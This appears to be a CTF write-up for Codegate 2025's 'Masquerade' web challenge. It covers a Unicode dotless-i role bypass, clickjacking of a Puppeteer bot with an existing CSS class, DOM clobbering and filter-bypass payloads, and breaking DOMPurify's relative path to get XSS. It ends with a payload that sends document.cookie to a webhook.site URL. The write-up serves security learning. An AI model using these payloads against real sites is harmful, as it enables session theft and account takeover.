16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div><div class="dotted-line-vert h-auto mb-10"></div></div><div class="relative flex flex-col items-center break-words max-w-[89rem] mx-auto px-[20.5rem] pt-24 pb-14 max-xl:ml-0 max-xl:pl-12 max-lg:mr-0 max-lg:pr-12 max-md:px-8 max-sm:px-5"><div class="w-full flex flex-col items-start"><span class="text-xl opacity-60 mb-1">30/03/2025</span><h1 class="mb-7">Masquerade</h1><div class="markdown mb-7 flex flex-col gap-y-3"><p>Enjoy Masquerade with many roles!</p>
<p><a href="http://3.35.104.112:3000/">http://3.35.104.112:3000/</a></p>
</div><div class="flex flex-wrap gap-3"><!--[--><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">language</i><span class="mr-4 text-black font-semibold">web</span></div><!--]--><div class="h-9 bg-almost-black rounded-full px-5 flex items-center"><span class="mr-4">41 solves</span><span class="opacity-60">250 points</span></div><div class="h-9 bg-almost-black rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-3">person</i><span class="mr-4">by unknown</span></div></div><div class="w-full flex border border-almost-black-lighter rounded-2.5xl mt-7 mb-9 max-sm:flex-col"><div class="flex-1 flex flex-col gap-y-2 px-6 pt-4 pb-5"><span>Attachments</span><!--[--><a href="https://gen.codegate.org/files/fa6896ca7f365477d384f111c75385ed/for_user.zip?token=eyJ1c2VyX2lkIjoxMDY2LCJ0ZWFtX2lkIjoxNDMsImZpbGVfaWQiOjQ3fQ.Z-jEQw.mBoBk7MKovNZAgR6yymjvREJf24" class="underline">for_user.zip</a><!--]--></div><button class="pl-9 pr-10 font-semibold flex items-center border-l border-almost-black-lighter rounded-tr-2.5xl rounded-br-2.5xl transition-colors hover:bg-almost-black active:bg-almost-black-lighter max-sm:border-l-0 max-sm:border-t max-sm:pl-6 max-sm:py-4 max-sm:rounded-tr-none max-sm:rounded-bl-2.5xl"><i class="material-symbols-outlined text-2xl mr-4">download</i> Download all </button></div></div><div id="article" class="markdown w-full flex flex-col gap-y-3 px-4 max-md:px-0"><p><em>Written by jia_jie and hal0g3n</em></p>
<h1 id="privilege-escalation" tabindex="-1">Privilege escalation</h1>
<p>Firstly, we have to get into the website. So we quickly register and login, and the below page shows.</p>
<p><img src="/ctf-writeups/codegate25quals/home.png" alt=""></p>
<p>ðŸ¤” we are able to change our <code>ROLE</code>, but to what?</p>
<pre class="named-fence-block"><code class="language-javascript">router.post('/role', authenticateJWT, (req, res) =&gt; {
    const { role } = req.body;
    const token = setRole(req.user.uuid, role);

    if (!token) return res.status(400).json({ message: "Invalid Role." });
    res.json({ message: "Role Changed.", token });
});
</code><div class="named-fence-filename">user.js</div></pre>
<p>The route to change role does not reveal much, so we step into <code>setRole</code> and take peek.</p>
<pre class="named-fence-block"><code class="language-javascript">const role_list = ["ADMIN", "MEMBER", "INSPECTOR", "DEV", "BANNED"];

function checkRole(role) {
    const regex = /^(ADMIN|INSPECTOR)$/i;
    return regex.test(role);
}

...

const setRole = (uuid, input) =&gt; {
    const user = getUser(uuid);

    if (checkRole(input)) return false;
    if (!role_list.includes(input.toUpperCase())) return false;

    users.set(uuid, { ...user, role: input.toUpperCase() });
    const updated = getUser(uuid);
    const payload = { uuid, ...updated }
    delete payload.password;
    const token = generateToken(payload);
    return token;
};
</code><div class="named-fence-filename">userModel.js</div></pre>
<p>Hidden in these 3 functions, is our first exploit to obtain privilege escalation.</p>
<h1 id="encodings" tabindex="-1">Encodings</h1>
<p>Let's breakdown <code>setRole()</code>, it performs these 3 steps:</p>
<ol>
<li><code>checkRole(input)</code> - checks the input against the regex <code>/^(ADMIN|INSPECTOR)$/i</code>
<ul>
<li>A convoluted way to check if <code>input == admin || input == inspector</code> (<code>/i</code> indicating case insensitive)</li>
</ul>
</li>
<li><code>!role_list.includes(input.toUpperCase())</code> - checks <code>input.toUpperCase()</code> is in the list</li>
<li>Sets <code>role: input.toUpperCase()</code></li>
</ol>
<p>With the title of this subsection, the missing <code>.toUpperCase()</code> in step 1 jumps out, and we can in fact abuse it. Due to how javascript handles characters and their uppercase, there are special characters mapping to <code>I</code> in <code>toUpperCase()</code>. One example is the dotless i <code>Ä±</code> (<code>U+0131</code>). So we just put our role as:</p>
<p><code>admÄ±n</code> or <code>Ä±nspector</code></p>
<p>And the regex would be none the wiser.</p>
<p><img src="/ctf-writeups/codegate25quals/role_changed.png" alt=""></p>
<p>Now we can MASQUERADE as any role we want ðŸ˜ˆ</p>
<blockquote>
<p><code>ADMIN</code> is used to give us permission to make posts, but not report them. We need to swap to <code>INSPECTOR</code> to report them for our XSS below</p>
</blockquote>
<h1 id="xss-part-1" tabindex="-1">XSS part 1</h1>
<p>Now we are finally able to make posts and submit them to the /report endpoint, we can finally start tackling the XSS.</p>
<p><img src="/ctf-writeups/codegate25quals/post_example.png" alt="Example post"></p>
<p>Looking at <code>index.js</code>, we can see the app sets a rather strict security policy:</p>
<pre class="named-fence-block"><code class="language-javascript">app.use((req, res, next) =&gt; {
    const nonce = crypto.randomBytes(16).toString('hex');

    res.setHeader("X-Frame-Options", "deny");

    if (req.path.startsWith('/admin')) {
        res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'self' 'unsafe-inline'`);
    } else {
        res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'nonce-${nonce}'`);
    }

    res.locals.nonce = nonce;

    next();
});
</code><div class="named-fence-filename">index.js</div></pre>
<p>Hence, although there is no sanitization performed on post content (shown below), we aren't able to execute any javascript.</p>
<pre class="named-fence-block"><code class="language-html">        &lt;div class="post-content"&gt;
            &lt;%- post.content %&gt;
        &lt;/div&gt;
</code><div class="named-fence-filename">post/view.ejs</div></pre>
<h1 id="dead-ends" tabindex="-1">Dead ends</h1>
<p>One of the first things that I tried was redirecting the bot to /admin by passing a post id like <code>../admin/test</code>, where there is a more lenient CSP that allows inline scripts. However, the /report endpoint checks that the post id is valid before continuing:</p>
<pre class="named-fence-block"><code class="language-javascript">    const post_id = req.params.post_id;
    const post = getPostById(post_id);

    if (!post) return res.status(404).json({ message: "Post Not Found." });
</code><div class="named-fence-filename">routes/report.js</div></pre>
<p>However, the bot does have some form of interaction with the page, which we could exploit:</p>
<pre class="named-fence-block"><code class="language-javascript">        await page.goto(`http://localhost:3000/post/${post_id}`, { timeout: 3000, waitUntil: "domcontentloaded" });

        await delay(1000);

        const button = await page.$('#delete');
        await button.click();

        await delay(1000);
</code><div class="named-fence-filename">utils/report.js</div></pre>
<p>I tried a number of ways to exploit this behavior and redirect the bot to /admin. Looking at post/view.ejs, we can see <code>window.conf</code> being used to set the redirect url:</p>
<pre class="named-fence-block"><code class="language-javascript">        &lt;% if (isOwner || isAdmin) { %&gt;
            window.conf = window.conf || {
                deleteUrl: "/post/delete/&lt;%= post.post_id %&gt;"
            };
        &lt;% } else { %&gt;
            window.conf = window.conf || {
                deleteUrl: "/error/role"
            };
        &lt;% } %&gt;

...

        const deleteButton = document.querySelector("#delete");

        deleteButton.addEventListener("click", () =&gt; {
            location.href = window.conf.deleteUrl;
        });
</code><div class="named-fence-filename">post/view.ejs</div></pre>
<p>So if we're able to set <code>window.conf.deleteUrl</code>, we can redirect to <code>/admin/test</code>. I recalled that elements can be accessed from the window object using their id, for example:</p>
<pre><code class="language-html">&lt;div id="conf"&gt;&lt;/div&gt;
</code></pre>
<p>and <code>window.conf</code> will point to <code>HTMLDivElement</code>. However, we also need to set the <code>deleteUrl</code> attribute. I discovered that by using a form element, we are able to set properties directly using the input names, like so:</p>
<pre><code class="language-html">&lt;form name="conf"&gt;
  &lt;input name="deleteUrl" value="/admin/test"&gt;
&lt;/form&gt;
</code></pre>
<p>However, there is a problem: <code>window.conf.deleteUrl</code> points to <code>[object HTMLInputElement]</code>; we need to call <code>window.conf.deleteUrl.value</code> to get <code>/admin/test</code>. We need a html element where we can control its <code>toString()</code> value just from its html attributes alone.</p>
<p>Consulting my large language model of choice, I learn that <code>a</code> tags return their <code>href</code> attribute when stringified: for example, <code>&lt;a href="/admin/test"&gt;&lt;/a&gt; -&gt; "/admin/test"</code>. But submitting a post with the <code>a</code> tag triggers the mystery filter. Fortunately, there was another element that was not blacklisted: <code>&lt;area&gt;</code>, which similarly uses <code>href</code> as its string representation.</p>
<p>Unfortunately, form elements only add valid input fields as attributes: <code>input</code>, <code>textarea</code>, <code>select</code> and <code>button</code>, none of which provide a useful <code>toString</code> implementation. Having no way to add an area tag under <code>window.conf</code>, we have to abandon this approach.</p>
<p>I also tried using a meta tag: <code>&lt;meta http-equiv="refresh" content="0;url=https://example.com"&gt;</code>. However, the <code>meta</code> tag was also blacklisted by the app's mystery filter. (After the CTF, I learned that other participants bypassed it using slashes instead of spaces: <code>&lt;meta/http-equiv="refresh"/content="0;url=https://example.com"&gt;</code>.)</p>
<blockquote>
<p><strong>DOM Clobbering Solution</strong></p>
<p>Reading other participants' solutions after the CTF ended, I realised it's actually possible using the following payload (from @tanknight):</p>
<pre><code class="language-html">&lt;a id=conf&gt;&lt;/a&gt;
&lt;a id=conf name=deleteUrl href=http://xssendpoint&gt;&lt;/a&gt;
</code></pre>
</blockquote>
<h1 id="clickjacking" tabindex="-1">Clickjacking</h1>
<p>After doing some googling, I realised that when another element overlaps the one puppeteer is clicking, that element is clicked instead. This is because puppeteer just moves the mouse to the x/y location and clicks:</p>
<pre><code class="language-typescript">  async click(
    this: ElementHandle&lt;Element&gt;,
    options: Readonly&lt;ClickOptions&gt; = {}
  ): Promise&lt;void&gt; {
    await this.scrollIntoViewIfNeeded();
    const {x, y} = await this.clickablePoint(options.offset);
    await this.frame.page().mouse.click(x, y, options);
  }
</code></pre>
<p>So if we create a massive button that covers the entire screen, it should be clicked instead of the delete button:</p>
<pre><code class="language-html">&lt;form action="/admin/test"&gt;
  &lt;button type="submit" style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;"&gt;&lt;/button&gt;
&lt;/form&gt;
</code></pre>
<p>However, this doesn't render as expected:</p>
<p><img src="/ctf-writeups/codegate25quals/clickjacking_1.png" alt=""></p>
<p>Checking the console, we see this is because of the CSP blocking inline styles:</p>
<p><img src="/ctf-writeups/codegate25quals/style_csp_error.png" alt=""></p>
<p>Thus, we can only use existing styles served by the app. I checked the css files and found the following "css gadget":</p>
<pre class="named-fence-block"><code class="language-css">.slider {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #ccc;
    -webkit-transition: .4s;
    transition: .4s;
}
</code><div class="named-fence-filename">switch.css</div></pre>
<p>Now using the following payload, the button renders correctly and gets clicked by the bot (I verified this using webhook)</p>
<pre><code class="language-html">&lt;link rel="stylesheet" href="/css/switch.css" /&gt;
&lt;form action="https://webhook.site/26d62c0b-fd91-4f30-9f78-152de98c1012"&gt;
  &lt;button type="submit" class="slider"&gt;&lt;/button&gt;
&lt;/form&gt;
</code></pre>
<p>Now that we can redirect to /admin/test, hopefully we have more luck with XSS there.</p>
<h1 id="xss-part-2" tabindex="-1">XSS part 2</h1>
<p>Achieving XSS on <code>/admin/test</code> is no easy feat, especially due to the site using DOMPurify <code>3.2.4</code>, the latest version of it. No way we are bypassing DOMPurify with a 0day.</p>
<pre class="named-fence-block"><code class="language-html">&lt;script src="../js/purify.min.js"&gt;&lt;/script&gt;
&lt;script&gt;
    const post_title = document.querySelector(".post_title");
    const post_content = document.querySelector(".post_content");
    const error_div = document.querySelector(".error_div");

    const urlSearch = new URLSearchParams(location.search);
    const title = urlSearch.get('title');
    const content = urlSearch.get('content');

    if (!title &amp;&amp; !content) {
        post_content.innerHTML = "Usage: ?title=a&amp;content=b";
    } else {
        try {
            post_title.innerHTML = DOMPurify.sanitize(title);
            post_content.innerHTML = DOMPurify.sanitize(content);
        } catch {
            post_title.innerHTML = title;
            post_content.innerHTML = content;
        }
    }
&lt;/script&gt;
</code><div class="named-fence-filename">admin/test.html</div></pre>
<p>However, the <code>try/catch</code> block jumps out, in such a small file, this make it seem intentional, especially when our XSS is not <code>DOMurify.sanitize</code> when there is an error.</p>
<h1 id="relativity" tabindex="-1">Relativity</h1>
<p><code>DOMPurify.sanitize</code> does not throw any errors, since worst comes to worst it will still output <code>""</code> unless configured otherwise. There is another way to kill, and that is by removing the <code>DOMPurify</code> object completely. This sounds crazy but it is possible, especially since it is included in the <em>relative</em> path <code>../js/purify.min.js</code>. If we could just access this same site with another route, we can effectively break this path.</p>
<p>This turned out to be a lot easier than expected. All we need is to include an additional slash, going to the route <code>/admin/test/</code>. That extra slash resulted in the path resolving to <code>/admin/test</code> instead of <code>/test</code> in the express backend, meaning instead of pointing to <code>/js/purify.min.js</code>, we access <code>/admin/js/purify.min.js</code>. <code>DOMPurify</code> now returns 404 and we get our unfiltered XSS.</p>
<p>Payload: <code>/admin/test/?content=&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
<p><img src="/ctf-writeups/codegate25quals/admin_test_xss.png" alt=""></p>
<h1 id="final-payload" tabindex="-1">Final Payload</h1>
<pre><code class="language-html">&lt;link rel="stylesheet" href="/css/switch.css" /&gt;
&lt;form action="/admin/test/"&gt;
  &lt;input
    type="hidden"
    name="content"
    value="&lt;img src=x onerror=location.href=`https:\/\/webhook.site\/26d62c0b-fd91-4f30-9f78-152de98c1012?t=${document.cookie}`&gt;"
  /&gt;
  &lt;button type="submit" class="slider"&gt;&lt;/button&gt;
&lt;/form&gt;
</code></pre>
<p>We add the <code>/</code> to the form action as well as our XSS attack in the post, and we obtain our jwt with the flag:</p>
<p><code>codegate2025{16a7eeb64ec6b150c9308509a039cec0c137dfd766ef13ccb8d6d9e0cf54aef3}</code></p>
</div><div class="fixed w-[17.5rem] h-full top-0 right-0 pointer-events-none pr-8 max-lg:hidden"><!----></div></div><!----></div></div>
    
  

</body></html>